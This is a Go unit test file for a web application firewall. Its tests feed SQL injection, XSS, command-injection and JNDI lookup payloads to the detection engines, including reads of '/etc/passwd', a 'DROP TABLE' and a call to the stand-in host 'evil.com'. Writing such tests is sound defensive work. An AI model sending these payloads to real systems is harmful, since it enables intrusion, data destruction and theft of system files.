package unit

import (
	"context"
	"net/http"
	"net/url"
	"testing"
	"time"

	"github.com/FortressWAF/FortressWAF/internal/engine"
)

func newTestRequest(method, path string, queryParams map[string]string) *http.Request {
	req := &http.Request{
		Method: method,
		URL: &url.URL{
			Path:     path,
			RawQuery: "",
		},
		Header: make(http.Header),
		Body:   nil,
		Host:   "example.com",
	}
	if len(queryParams) > 0 {
		q := req.URL.Query()
		for k, v := range queryParams {
			q.Add(k, v)
		}
		req.URL.RawQuery = q.Encode()
	}
	return req
}

func newTestContext(req *http.Request) *engine.RequestContext {
	return &engine.RequestContext{
		Request:     req,
		RealIP:      "192.168.1.1",
		UserAgent:   "Mozilla/5.0",
		Path:        req.URL.Path,
		Method:      req.Method,
		Headers:     make(map[string]string),
		Body:        nil,
		ContentType: "text/html",
		Context:     context.Background(),
	}
}

func TestSQLInjectionEngineInitialization(t *testing.T) {
	cfg := engine.EngineConfig{
		DevMode: false,
		SQLI:    engine.NewSQLInjectionEngine(false),
	}
	e := engine.New(cfg)
	if e == nil {
		t.Fatal("expected engine, got nil")
	}
}

func TestSQLInjectionEngineNoPanic(t *testing.T) {
	cfg := engine.EngineConfig{
		DevMode: false,
		SQLI:    engine.NewSQLInjectionEngine(false),
	}
	e := engine.New(cfg)

	payloads := []string{
		"' OR '1'='1",
		"1 UNION SELECT * FROM users",
		"admin' AND SLEEP(5)--",
		"'; DROP TABLE users--",
		"0x3127204f52202731273d2731",
		"%27%20OR%20%271%27%3D%271",
		"1'/**/OR/**/'1'='1",
		"1' OR 1=1 --",
	}

	for _, payload := range payloads {
		req := newTestRequest("GET", "/search", map[string]string{"query": payload})
		ctx := newTestContext(req)
		dec, err := e.Inspect(ctx)
		if err != nil {
			t.Errorf("unexpected error for payload %q: %v", payload, err)
		}
		if dec == nil {
			t.Errorf("expected decision for payload %q, got nil", payload)
		}
	}
}

func TestXSSEngineInitialization(t *testing.T) {
	cfg := engine.EngineConfig{
		DevMode: false,
		XSS:     engine.NewXSSEngine(false),
	}
	e := engine.New(cfg)
	if e == nil {
		t.Fatal("expected engine, got nil")
	}
}

func TestXSSEngineNoPanic(t *testing.T) {
	cfg := engine.EngineConfig{
		DevMode: false,
		XSS:     engine.NewXSSEngine(false),
	}
	e := engine.New(cfg)

	payloads := []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"javascript:alert(1)",
		"onclick=alert(1)",
		"<body onload=alert(1)>",
		"<input onfocus=alert(1) autofocus>",
	}

	for _, payload := range payloads {
		req := newTestRequest("GET", "/comment", map[string]string{"text": payload})
		ctx := newTestContext(req)
		dec, err := e.Inspect(ctx)
		if err != nil {
			t.Errorf("unexpected error for payload %q: %v", payload, err)
		}
		if dec == nil {
			t.Errorf("expected decision for payload %q, got nil", payload)
		}
	}
}

func TestRCEEngineInitialization(t *testing.T) {
	cfg := engine.EngineConfig{
		DevMode: false,
		RCE:     engine.NewRCEInjection(false),
	}
	e := engine.New(cfg)
	if e == nil {
		t.Fatal("expected engine, got nil")
	}
}

func TestRCEEngineNoPanic(t *testing.T) {
	cfg := engine.EngineConfig{
		DevMode: false,
		RCE:     engine.NewRCEInjection(false),
	}
	e := engine.New(cfg)

	payloads := []string{
		"; ls -la",
		"| cat /etc/passwd",
		"`cat /etc/passwd`",
		"$(cat /etc/passwd)",
		"{{7*7}}",
		"${jndi:ldap://evil.com/a}",
	}

	for _, payload := range payloads {
		req := newTestRequest("GET", "/api/exec", map[string]string{"cmd": payload})
		ctx := newTestContext(req)
		dec, err := e.Inspect(ctx)
		if err != nil {
			t.Errorf("unexpected error for payload %q: %v", payload, err)
		}
		if dec == nil {
			t.Errorf("expected decision for payload %q, got nil", payload)
		}
	}
}

func TestDDoSEngineInitialization(t *testing.T) {
	cfg := engine.EngineConfig{
		DevMode: false,
		DDoS:    engine.NewDDoSProtection(false),
	}
	e := engine.New(cfg)
	if e == nil {
		t.Fatal("expected engine, got nil")
	}
}

func TestDDoSEngineNoPanic(t *testing.T) {
	cfg := engine.EngineConfig{
		DevMode: false,
		DDoS:    engine.NewDDoSProtection(false),
	}
	e := engine.New(cfg)

	for i := 0; i < 10; i++ {
		req := newTestRequest("GET", "/api/data", nil)
		ctx := newTestContext(req)
		dec, err := e.Inspect(ctx)
		if err != nil {
			t.Errorf("unexpected error: %v", err)
		}
		if dec == nil {
			t.Error("expected decision, got nil")
		}
	}
}

func TestProtocolEngineInitialization(t *testing.T) {
	cfg := engine.EngineConfig{
		DevMode:  false,
		Protocol: engine.NewProtocolAnomaly(false),
	}
	e := engine.New(cfg)
	if e == nil {
		t.Fatal("expected engine, got nil")
	}
}

func TestProtocolEngineNoPanic(t *testing.T) {
	cfg := engine.EngineConfig{
		DevMode:  false,
		Protocol: engine.NewProtocolAnomaly(false),
	}
	e := engine.New(cfg)

	methods := []string{"GET", "POST", "PUT", "DELETE", "TRACE", "OPTIONS"}

	for _, method := range methods {
		req := newTestRequest(method, "/", nil)
		ctx := newTestContext(req)
		dec, err := e.Inspect(ctx)
		if err != nil {
			t.Errorf("unexpected error for method %q: %v", method, err)
		}
		if dec == nil {
			t.Errorf("expected decision for method %q, got nil", method)
		}
	}
}

func TestBotEngineInitialization(t *testing.T) {
	cfg := engine.EngineConfig{
		DevMode: false,
		Bot:     engine.NewBotDetector(false),
	}
	e := engine.New(cfg)
	if e == nil {
		t.Fatal("expected engine, got nil")
	}
}

func TestBotEngineNoPanic(t *testing.T) {
	cfg := engine.EngineConfig{
		DevMode: false,
		Bot:     engine.NewBotDetector(false),
	}
	e := engine.New(cfg)

	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"sqlmap/1.4.2#stable (http://sqlmap.org)",
		"Nikto/2.1.6",
		"HeadlessChrome/91.0.4472.0 Safari/537.36",
	}

	for _, ua := range userAgents {
		req := newTestRequest("GET", "/", nil)
		req.Header.Set("User-Agent", ua)
		ctx := newTestContext(req)
		ctx.UserAgent = ua
		dec, err := e.Inspect(ctx)
		if err != nil {
			t.Errorf("unexpected error for UA %q: %v", ua, err)
		}
		if dec == nil {
			t.Errorf("expected decision for UA %q, got nil", ua)
		}
	}
}

func TestRequestContextCreation(t *testing.T) {
	req := newTestRequest("POST", "/api/users", map[string]string{
		"name":  "test",
		"email": "test@example.com",
	})
	req.RemoteAddr = "192.0.2.1:12345"
	req.Header.Set("Content-Type", "application/json")
	// A client-supplied forwarded header must not become the recorded
	// address: NewRequestContext is unauthenticated about proxies, so it
	// uses the TCP peer. Engine.ContextFromRequest resolves through the
	// trusted-proxy list instead (see internal/engine/clientip_test.go).
	req.Header.Set("X-Forwarded-For", "10.0.0.1")
	req.Header.Set("User-Agent", "TestClient/1.0")

	ctx := engine.NewRequestContext(req)

	if ctx.Method != "POST" {
		t.Errorf("expected method POST, got %s", ctx.Method)
	}
	if ctx.Path != "/api/users" {
		t.Errorf("expected path /api/users, got %s", ctx.Path)
	}
	if ctx.RealIP != "192.0.2.1" {
		t.Errorf("NewRequestContext must ignore X-Forwarded-For: expected peer 192.0.2.1, got %s", ctx.RealIP)
	}
	if ctx.UserAgent != "TestClient/1.0" {
		t.Errorf("expected User-Agent TestClient/1.0, got %s", ctx.UserAgent)
	}
}

func TestEngineWithNilInspectors(t *testing.T) {
	cfg := engine.EngineConfig{
		DevMode: true,
		SQLI:    nil,
		XSS:     nil,
	}
	e := engine.New(cfg)
	req := newTestRequest("GET", "/", nil)
	ctx := newTestContext(req)
	dec, err := e.Inspect(ctx)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec == nil {
		t.Fatal("expected decision, got nil")
	}
}

func TestEngineTimeoutContext(t *testing.T) {
	cfg := engine.EngineConfig{
		DevMode: false,
		SQLI:    engine.NewSQLInjectionEngine(false),
		XSS:     engine.NewXSSEngine(false),
	}

	e := engine.New(cfg)

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	req := newTestRequest("GET", "/", nil)
	httpCtx := engine.NewRequestContext(req)
	httpCtx.Context = ctx

	dec, err := e.Inspect(httpCtx)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec == nil {
		t.Fatal("expected decision, got nil")
	}
}

func TestEngineAllowAction(t *testing.T) {
	cfg := engine.EngineConfig{
		DevMode: false,
		SQLI:    engine.NewSQLInjectionEngine(false),
	}

	e := engine.New(cfg)

	req := newTestRequest("GET", "/products/123", map[string]string{"format": "json"})
	ctx := newTestContext(req)
	dec, err := e.Inspect(ctx)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec.Action != engine.ActionAllow {
		t.Errorf("expected allow for normal request, got %v", dec.Action)
	}
}

func TestFullEngineNoPanic(t *testing.T) {
	cfg := engine.EngineConfig{
		DevMode:  false,
		SQLI:     engine.NewSQLInjectionEngine(false),
		XSS:      engine.NewXSSEngine(false),
		RCE:      engine.NewRCEInjection(false),
		DDoS:     engine.NewDDoSProtection(false),
		Protocol: engine.NewProtocolAnomaly(false),
		Bot:      engine.NewBotDetector(false),
	}

	e := engine.New(cfg)

	testCases := []struct {
		method string
		path   string
		query  map[string]string
	}{
		{"GET", "/", nil},
		{"GET", "/search", map[string]string{"q": "normal search"}},
		{"POST", "/api/data", map[string]string{"name": "test"}},
		{"GET", "/admin", nil},
	}

	for _, tc := range testCases {
		req := newTestRequest(tc.method, tc.path, tc.query)
		ctx := newTestContext(req)
		dec, err := e.Inspect(ctx)
		if err != nil {
			t.Errorf("unexpected error for %s %s: %v", tc.method, tc.path, err)
		}
		if dec == nil {
			t.Errorf("expected decision for %s %s, got nil", tc.method, tc.path)
		}
	}
}
